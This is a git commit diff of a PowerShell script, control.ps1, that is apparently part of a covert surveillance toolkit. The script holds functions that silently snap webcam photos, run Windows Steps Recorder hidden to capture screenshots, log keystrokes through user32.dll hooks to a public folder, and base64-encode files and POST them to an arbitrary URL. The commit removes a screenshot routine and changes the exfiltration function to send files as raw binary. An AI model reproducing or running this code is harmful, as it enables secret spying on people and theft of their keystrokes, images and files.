665e1276ea6f6b34055c199e1464bbc246dcb445
Avihay Eldad <46644022+avihayeldad@users.noreply.github.com>
2024-04-03 14:01:44 +0300

    Update control.ps1

--- control.ps1
+++ control.ps1
@@ -1,50 +1,29 @@
-function take_selfi {
-    start microsoft.windows.camera:                                                                                                                                                    
-    start-sleep 1                                                                                                                                                                      
-    Set-Variable -Name wshell -Value (New-Object -ComObject wscript.shell);                                                                                                            
-    $wshell.SendKeys('~');                                                                                                                                                             
-    start-sleep 1                                                                                                                                                                      
-    # Get all processes related to Windows Camera                                                                                                                                      
-    Set-Variable -Name cameraProcesses -Value (Get-Process | Where-Object { $_.ProcessName -eq "WindowsCamera" })                                                                      
+function take_selfi{
+start microsoft.windows.camera:                                                                                                                                                    
+start-sleep 1                                                                                                                                                                      
+Set-Variable -Name wshell -Value (New-Object -ComObject wscript.shell);                                                                                                            
+$wshell.SendKeys('~');                                                                                                                                                             
+start-sleep 1                                                                                                                                                                      
+# Get all processes related to Windows Camera                                                                                                                                      
+Set-Variable -Name cameraProcesses -Value (Get-Process | Where-Object { $_.ProcessName -eq "WindowsCamera" })                                                                      
                                                                                                                                                                                    
-    # If there are any Windows Camera processes running, kill them                                                                                                                     
-    if ($cameraProcesses) {                                                                                                                                                            
-        foreach ($process in $cameraProcesses) {                                                                                                                                       
-            Stop-Process -Id $process.Id -Force
-        }
-    }
-
-    # Define paths
-    $cameraRollPath = [System.IO.Path]::Combine($env:USERPROFILE, "Pictures", "Camera Roll")
-    $publicFolderPath = "C:\Users\Public"
-
-    # Find the latest image file in the camera roll folder
-    $latestImage = Get-ChildItem -Path $cameraRollPath -Filter *.jpg | Sort-Object LastWriteTime -Descending | Select-Object -First 1
-
-    if ($latestImage) {
-        # Copy the latest image to the Public folder
-        $destinationPath = [System.IO.Path]::Combine($publicFolderPath, $latestImage.Name)
-        Copy-Item -Path $latestImage.FullName -Destination $destinationPath -Force
-        Write-Output "Picture successfully copied to $destinationPath"
-    } else {
-        Write-Output "No image found in the camera roll folder"
+# If there are any Windows Camera processes running, kill them                                                                                                                     
+if ($cameraProcesses) {                                                                                                                                                            
+    foreach ($process in $cameraProcesses) {                                                                                                                                       
+        Stop-Process -Id $process.Id -Force
     }
 }
-
-
-
-
-                                                                                                                                                                              
-function start_psr {                                                                                                                                                                
+}
+                                                                                                                                                                                   
+function start_psr{                                                                                                                                                                
 psr.exe /start /output C:\Users\Public\screenshots.zip /sc 1 /gui 0                                                                                                                                                                                                                                 
 }                                                                                                                                                                                  
                                                                                                                                                                                    
-function stop_psr {                                                                                                                                                                 
+function stop_psr{                                                                                                                                                                 
 psr.exe /stop                                                                                                                                                                                                                                                              
 }                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                    
 function KeyLogger($Path="C:\Users\Public\keylogger.txt", $DurationInSeconds=60) {
-   
     # Signatures for API Calls
     $signatures = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -95,52 +74,28 @@ function KeyLogger($Path="C:\Users\Public\keylogger.txt", $DurationInSeconds=60)
     }
 }         
 
-function Screenshot {
-    param(
-        [string]$FileName = "Screenshot.png"
-    )
-
-    # Importing necessary .NET assemblies
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-
-    # Create a bitmap using the dimensions of the screen
-    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-
-    # Create a Graphics object from the bitmap
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-
-    # Capture the screen and save it to the bitmap
-    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-
-    # Save the bitmap to a file
-    $filePath = Join-Path -Path $env:Public -ChildPath $FileName
-    $bitmap.Save($filePath)
-
-    Write-Host "Screenshot saved to: $filePath"
-}
-
 function SendFile {
     param (
         [string]$FilePath,
         [string]$Url
     )
 
-    # Read file content
-    $fileContent = Get-Content -Path $FilePath -Raw
-
-    # Encode file content to base64
-    $base64EncodedContent = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
-
-    # Create a JSON object to send
-    $body = @{
-        FileContent = $base64EncodedContent
-    } | ConvertTo-Json
-
     try {
+        # Read file content as binary
+        $fileContent = Get-Content -Path $FilePath -Encoding Byte
+
+        # Encode file content to base64
+        $base64EncodedContent = [System.Convert]::ToBase64String($fileContent)
+
+        # Create a JSON object to send
+        $body = @{
+            FileContent = $base64EncodedContent
+        } | ConvertTo-Json
+
         # Send POST request to the URL
         Invoke-RestMethod -Uri $Url -Method Post -ContentType "application/json" -Body $body
-    } catch {
+    } 
+    catch {
+        Write-Host "Error occurred: $_"
     }
-}
+}         
